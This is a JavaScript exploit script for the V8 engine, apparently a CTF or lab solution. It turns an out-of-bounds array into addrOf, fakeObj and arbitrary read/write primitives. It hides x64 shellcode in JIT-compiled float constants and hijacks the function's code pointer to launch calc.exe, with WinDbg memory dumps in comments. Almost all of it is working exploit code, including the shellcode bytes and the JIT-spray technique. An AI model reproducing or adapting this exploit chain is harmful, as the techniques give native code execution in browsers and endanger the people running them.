function log(_str) {
	print(`${_str}`);
}

function dp(_obj) {
	%DebugPrint(_obj);
}

function sneaky() {

	function log(str) {
		var _log = document.getElementById('log');
		if (_log) {
			_log.innerText += str + '\n';
		}
	}
	
	let jit_shellcode = new Uint8Array([0x90,0x48,0x31,0xd2,0x90,0x90,0xeb,0xc,0x65,0x48,0x8b,0x42,0x60,0x90,0xeb,0xc,0x48,0x8b,0x70,0x18,0x90,0x90,0xeb,0xc,0x48,0x8b,0x76,0x20,0x90,0x90,0xeb,0xc,0x4c,0x8b,0x0e,0x90,0x90,0x90,0xeb,0xc,0x4d,0x8b,0x09,0x90,0x90,0x90,0xeb,0xc,0x4d,0x8b,0x49,0x20,0x90,0x90,0xeb,0xc,0xe9,0x4a,0x03,0x00,0x00,0x90,0xeb,0xc,0x41,0x8b,0x49,0x3c,0x90,0x90,0xeb,0xc,0x4d,0x31,0xff,0x90,0x90,0x90,0xeb,0xc,0x41,0xb7,0x88,0x90,0x90,0x90,0xeb,0xc,0x4d,0x01,0xcf,0x90,0x90,0x90,0xeb,0xc,0x49,0x01,0xcf,0x90,0x90,0x90,0xeb,0xc,0x45,0x8b,0x3f,0x90,0x90,0x90,0xeb,0xc,0x90,0x4d,0x01,0xcf,0x90,0x90,0xeb,0xc,0x41,0x8b,0x4f,0x18,0x90,0x90,0xeb,0xc,0x45,0x8b,0x77,0x20,0x90,0x90,0xeb,0xf,0x4d,0x01,0xce,0x90,0x90,0x90,0xeb,0xf,0x48,0x85,0xc9,0x90,0x90,0x90,0xeb,0xf,0x75,0x2c,0x90,0x90,0x90,0x90,0xeb,0xf,0xe9,0x23,0x02,0x00,0x00,0x90,0xeb,0xf,0xff,0xc9,0x90,0x90,0x90,0x90,0xeb,0xf,0x48,0x31,0xf6,0x90,0x90,0x90,0xeb,0xf,0x41,0x8b,0x34,0x8e,0x90,0x90,0xeb,0xf,0x4c,0x01,0xce,0x90,0x90,0x90,0xeb,0xf,0x48,0x31,0xc0,0x90,0x90,0x90,0xeb,0xf,0x90,0x90,0x48,0x31,0xd2,0x90,0xeb,0xf,0xfc,0x90,0x90,0x90,0x90,0x90,0xeb,0xf,0xac,0x90,0x90,0x90,0x90,0x90,0xeb,0xf,0x84,0xc0,0x90,0x90,0x90,0x90,0xeb,0xf,0x74,0x5a,0x90,0x90,0x90,0x90,0xeb,0xf,0xc1,0xca,0x0d,0x90,0x90,0x90,0xeb,0xf,0x01,0xc2,0x90,0x90,0x90,0x90,0xeb,0xf,0xe9,0x88,0xff,0xff,0xff,0x90,0xeb,0xf,0x44,0x39,0xc2,0x90,0x90,0x90,0xeb,0xf,0x0F,0x85,0x73,0xFE,0xFF,0xFF,0xeb,0xf,0x45,0x8b,0x57,0x24,0x90,0x90,0xeb,0xf,0x4d,0x01,0xca,0x90,0x90,0x90,0xeb,0xf,0x41,0x0f,0xb7,0x0c,0x4a,0x90,0xeb,0xf,0x45,0x8b,0x5f,0x1c,0x90,0x90,0xeb,0xf,0x4d,0x01,0xcb,0x90,0x90,0x90,0xeb,0xf,0x41,0x8b,0x04,0x8b,0x90,0x90,0xeb,0xf,0x4c,0x01,0xc8,0x90,0x90,0x90,0xeb,0xf,0xc3,0x90,0x90,0x90,0x90,0x90,0xeb,0xf,0x90,0xc3,0x90,0x90,0x90,0x90,0xeb,0xf,0x41,0xb8,0x98,0xfe,0x8a,0x0e,0xeb,0xf,0xe8,0xa9,0xfc,0xff,0xff,0x90,0xeb,0xf,0x48,0x31,0xc9,0x90,0x90,0x90,0xeb,0xf,0x51,0x90,0x90,0x90,0x90,0x90,0xeb,0xf,0x4d,0x31,0xd2,0x90,0x90,0x90,0xeb,0xf,0x41,0xba,0x63,0x61,0x6c,0x63,0xeb,0xf,0xb9,0x2e,0x65,0x78,0x65,0x90,0xeb,0xf,0x48,0xc1,0xe1,0x20,0x90,0x90,0xeb,0xf,0x4c,0x01,0xd1,0x90,0x90,0x90,0xeb,0xf,0x90,0x51,0x90,0x90,0x90,0x90,0xeb,0xf,0x48,0x8d,0x0c,0x24,0x90,0x90,0xeb,0xf,0x48,0x31,0xd2,0x90,0x90,0x90,0xeb,0xf,0x48,0xff,0xc2,0x90,0x90,0x90,0xeb,0xf,0x48,0x83,0xec,0x48,0x90,0x90,0xeb,0xf,0x48,0x83,0xec,0x58,0x90,0x90,0xeb,0xf,0x90,0x90,0x52,0x90,0x90,0x90,0xeb,0xf,0x90,0x90,0x51,0x90,0x90,0x90,0xeb,0xf,0xff,0xd0,0x90,0x90,0x90,0x90,0xeb,0xf,0x90,0x90,0x90,0x90,0x90,0x90,0x90,0x90,0x90])
	let ab = new ArrayBuffer(0x300);
	let uab = new Uint8Array(ab);
	let fab = new Float64Array(ab);
	uab.set(jit_shellcode);
	// console.log(fab) // d8.exe --allow-natives-syntax --shell pop.js
	
	const jit = () => {
		return [1.97118317862187e-246,1.9711301900293496e-246,1.9711823868697424e-246,1.9711824210688e-246,1.9711828967254104e-246,1.9711828966421608e-246,1.9711824203195522e-246,1.9710251538347258e-246,1.971182539666601e-246,1.9711829007322022e-246,1.9711828987595668e-246,1.9711828999298813e-246,1.9711828999298803e-246,1.9711828975412576e-246,1.9711831650358121e-246,1.9711823863202913e-246,5.548385260674813e-232,5.5483866084552014e-232,5.548386608245035e-232,5.5483866055574394e-232,5.547942592663461e-232,5.54838660558628e-232,5.548386610338606e-232,5.548386577268016e-232,5.548386608455201e-232,5.548386607807868e-232,5.54858817345081e-232,5.548386605575843e-232,5.5483866055757856e-232,5.548386605584544e-232,5.54838660556586e-232,5.548386599447035e-232,5.548386605584817e-232,5.548728865584518e-232,5.5483866079030605e-232,5.636005154816237e-232,5.5483853071654144e-232,5.548386608267739e-232,5.548170027164773e-232,5.5483852115597425e-232,5.548386608314605e-232,5.5483865390257476e-232,5.5483866081740075e-232,5.548386605575802e-232,5.548386605585102e-232,5.4461540018054204e-232,5.548728865449962e-232,5.5483866082296575e-232,5.5483866055757205e-232,5.548386608651451e-232,5.512893182999385e-232,5.5482542463006294e-232,5.548385265652447e-232,5.548386608595797e-232,5.548386605564232e-232,5.548385303650868e-232,5.548386608651447e-232,5.548386607939311e-232,5.548385746059598e-232,5.54838593802079e-232,5.548386602670103e-232,5.5483866026232374e-232,5.548386605587561e-232,-6.828527034422786e-229,7.1e-322,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0]
	}	
	
	for (let i = 0; i < 0x10000; i++) { 
		jit();jit();jit();jit(); 
	}

	return jit
}

let iAmSneaky = sneaky()

/*
0:011> dqs 0x020e0010d565-1 L20
0000020e`0010d564  00000008`00002ac1
0000020e`0010d56c  3ff19999`9999999a 0
0000020e`0010d574  3ff33333`33333333 1
0000020e`0010d57c  3ff4cccc`cccccccd 2
0000020e`0010d584  3ff66666`66666666 3
0000020e`0010d58c  00002259`0024e495 4  <- prop and map of oob_array
0000020e`0010d594  000000c8`0010d61d 5  <- length and elements of oob_array
0000020e`0010d59c  00002259`00244521 6  
0000020e`0010d5a4  000023e1`00002259 7
0000020e`0010d5ac  000023e1`000023e1 8
0000020e`0010d5b4  00002231`000023e1 9
0000020e`0010d5bc  0010d61d`0000000a 10
0000020e`0010d5c4  0010d61d`0010d61d 11 <- indices of object_array 
0000020e`0010d5cc  0010d59d`0010d59d 12
0000020e`0010d5d4  00002259`0024e515 13 <- prop and map of object_array
0000020e`0010d5dc  0000000a`0010d5b9 14 <- length and elements of object_array
0000020e`0010d5e4  00000008`00002ac1 15 <- maybe this is some validation for float_array
0000020e`0010d5ec  4000cccc`cccccccd 16
0000020e`0010d5f4  40019999`9999999a 17
0000020e`0010d5fc  40026666`66666666 18
0000020e`0010d604  40033333`33333333 19
0000020e`0010d60c  00002259`0024e495 20 <- prop and map of float_array	
0000020e`0010d614  00000008`0010d5e5 21 <- length and elements of float_array
0000020e`0010d61c  00002259`0025a4b1 22
0000020e`0010d624  0010d649`00002259 23
0000020e`0010d62c  00010001`00007bb1 24
0000020e`0010d634  00002225`00000000 25
0000020e`0010d63c  00000104`00259b11 26
0000020e`0010d644  000023fd`00000002 27
0000020e`0010d64c  41e95fd7`57c00000 28
0000020e`0010d654  0010d61d`000023fd 29 
0000020e`0010d65c  000029f9`0010d61d 30

0:002> dqs 0x02630010de89-1 L50
00000263`0010de88  00000008`00002ac1
00000263`0010de90  3ff19999`9999999a 0
00000263`0010de98  3ff33333`33333333 1
00000263`0010dea0  3ff4cccc`cccccccd 2
00000263`0010dea8  3ff66666`66666666 3
00000263`0010deb0  00002259`0024e495 4
00000263`0010deb8  000000c8`0010de89 5
00000263`0010dec0  00002259`00244521 6
00000263`0010dec8  000023e1`00002259 7
00000263`0010ded0  000023e1`000023e1 8
00000263`0010ded8  00002231`000023e1 9
00000263`0010dee0  0010dfcd`0000000a 10
00000263`0010dee8  0010dfcd`0010dfcd 11
00000263`0010def0  0010dfcd`0010dfcd 12
00000263`0010def8  00002259`0024e515 13
00000263`0010df00  0000000a`0010dedd 14
00000263`0010df08  00000008`00002ac1 15
00000263`0010df10  4000cccc`cccccccd 16
00000263`0010df18  40019999`9999999a 17
00000263`0010df20  40026666`66666666 18
00000263`0010df28  40033333`33333333 19
00000263`0010df30  00002259`0024e495 20
00000263`0010df38  00000008`0010df09 21
00000263`0010df40  00002259`0024b71d 22
00000263`0010df48  000023e1`00002259 23
00000263`0010df50  00000020`00000000 24
00000263`0010df58  00000020`00000000 25
00000263`0010df60  01000100`00000000 26
00000263`0010df68  0000025a`07a64bb0 27
00000263`0010df70  00000000`00000002 28
00000263`0010df78  00000000`00000000 29
00000263`0010df80  00245771`00000000 30
00000263`0010df88  000034c9`00002259 31
00000263`0010df90  00000000`0010df41 32
00000263`0010df98  00000000`00000000 33
00000263`0010dfa0  000023e0`00000020 34
00000263`0010dfa8  00000020`00000000 35
00000263`0010dfb0  00000000`00000000 36
00000263`0010dfb8  00000000`00000000 37
00000263`0010dfc0  00000000`00000000 38
00000263`0010dfc8  0025a4a5`00000000
00000263`0010dfd0  00002259`00002259
00000263`0010dfd8  00007bb1`0010dff9
00000263`0010dfe0  00000000`00010001
00000263`0010dfe8  00259b11`00002225
00000263`0010dff0  00000002`00000104
00000263`0010dff8  57c00000`000023fd
00000263`0010e000  000023fd`41e95fd7
00000263`0010e008  0010dfcd`0010dfcd
00000263`0010e010  00000002`000029f9
00000263`0010e018  0010dfcd`0010dfcd
00000263`0010e020  00000002`000029f9
00000263`0010e028  00000000`0010dfcd
00000263`0010e030  0010dfcd`000023fd
00000263`0010e038  000023fd`0010dfcd
00000263`0010e040  0010dfcd`0010dfcd
00000263`0010e048  7eadeef6`000025d5
00000263`0010e050  29386428`00000004
00000263`0010e058  b296797e`000025d5
00000263`0010e060  61287064`00000007
00000263`0010e068  00002231`be297272
00000263`0010e070  e3e5e7e0`00000004
00000263`0010e078  00003039`0010e049
00000263`0010e080  4bea2488`00000004
00000263`0010e088  000025d5`0025a7e3
00000263`0010e090  00000adc`dec6efee
00000263`0010e098  6974636e`7566280a
00000263`0010e0a0  220a7b20`29286e6f
00000263`0010e0a8  69727473`20657375
00000263`0010e0b0  2f2f0a0a`3b227463
00000263`0010e0b8  2065726f`6d204120
00000263`0010e0c0  61737265`76696e75
00000263`0010e0c8  676e6972`7473206c
00000263`0010e0d0  74616874`20796669
00000263`0010e0d8  74726f70`70757320
00000263`0010e0e0  74206572`6f6d2073
00000263`0010e0e8  61687420`73657079
00000263`0010e0f0  0a2e4e4f`534a206e
00000263`0010e0f8  20646573`55202f2f
00000263`0010e100  64206568`74207962
*/

const ab = new ArrayBuffer(8);
const wr = new DataView(ab);

function ftoi(_float) {
	wr.setFloat64(0, _float, true)
	return wr.getBigUint64(0, true)
}

function itof(_int) {
	wr.setBigUint64(0, _int, true)
	return wr.getFloat64(0, true)
}

function i32tof(_int0, _int1) {
	wr.setUint32(0, _int0, true)
	wr.setUint32(4, _int1, true)
	return wr.getFloat64(0, true)
}

function f32toi(_float) {
	wr.setFloat64(0, _float, true)
	return [wr.getUint32(0, true),wr.getUint32(4, true)]
}

const OOBLENGTH = 1337
let oob_array = [1.1, 1.2, 1.3, 1.4]
let an_object = {}
let object_array = [an_object, an_object, an_object, an_object, an_object]
let float_array = [2.1, 2.2, 2.3, 2.4]
let buf = new ArrayBuffer(0x100)
let arr = new Uint32Array(buf)
oob_array.len(100)

// log(`${4} ${ftoi(oob_array[4]).toString(16)}`)
// log(`${5} ${ftoi(oob_array[5]).toString(16)}`)
// log(`${6} ${ftoi(oob_array[6]).toString(16)}`)
// log(`${7} ${ftoi(oob_array[7]).toString(16)}`)
// log(`${8} ${ftoi(oob_array[8]).toString(16)}`)

function sandboxedAddrOf(_object) {
	object_array[0] = _object
	object_array[1] = _object
	object_array[2] = _object
	// dp(_object)
	// log((ftoi(oob_array[11]) & 0xffffffffn).toString(16))
	return Number(ftoi(oob_array[11]) & 0xffffffffn)
}

function sandboxedFakeObj(_address) {
	oob_array[11] = i32tof(_address, _address)
	oob_array[12] = i32tof(_address, _address)
	return object_array[2]
}

test = {"w00tw00t":0xcafebabe}
testAddress = sandboxedAddrOf(test)
testObject = sandboxedFakeObj(testAddress)

oob_array[36] = 0 // set the external_pointer to 0 (0x01000100)

function sandboxedRead(_address) {
	oob_array[37] = i32tof(_address, _address) // set data_ptr to our address
	let first = arr[0]
	let second = arr[1]
	return (BigInt(second)<<32n)+BigInt(first)
}

function sandboxedWrite(_address, _value) {
	oob_array[37] = i32tof(_address, _address) // set data_ptr to our address
	let [first, second] = f32toi(itof(_value))
	arr[0] = first
	arr[1] = second
}

// dp(test)
// log(sandboxedRead(testAddress-1).toString(16))
// sandboxedWrite(testAddress-1, 0x4141414142424242n)

async function tryToStablizeIt() {
//dp(iAmSneaky)
let jitAddress = sandboxedAddrOf(iAmSneaky)
let [journeyToCodePointer, _not_important] = f32toi(itof(sandboxedRead(jitAddress+0x18-1)))
journeyToCodePointer += 0xb
let codePointer = sandboxedRead(journeyToCodePointer)
sandboxedWrite(journeyToCodePointer, codePointer+0x7dn+0x2n)
log("[+] Run \"iAmSneaky()\" and enjoy calculator :)")
iAmSneaky() // somehow running it without this wrapper fails to pop calculator?
            // x64.release\d8.exe --allow-natives-syntax --shell pop.js
}

tryToStablizeIt()


